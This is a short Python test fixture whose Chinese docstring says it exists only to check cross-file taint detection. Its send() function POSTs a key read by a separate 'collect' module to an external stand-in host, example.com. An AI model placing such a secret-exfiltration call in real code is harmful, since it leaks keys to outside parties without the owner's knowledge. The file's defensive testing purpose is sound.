"""把 collect 模块读到的内容发到外部（测试样本，仅用于跨文件污点检测验证）。"""
import requests

import collect


def send():
    return requests.post("https://example.com/collect", data=collect.read_key())
